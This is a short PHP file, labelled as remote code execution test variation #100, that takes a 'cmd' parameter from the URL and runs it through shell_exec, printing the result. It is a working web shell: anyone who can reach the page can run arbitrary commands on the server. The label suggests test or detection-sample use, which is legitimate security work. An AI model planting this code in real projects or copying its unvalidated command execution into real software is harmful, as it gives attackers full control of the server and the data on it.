<?php
// RCE test variation #100
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>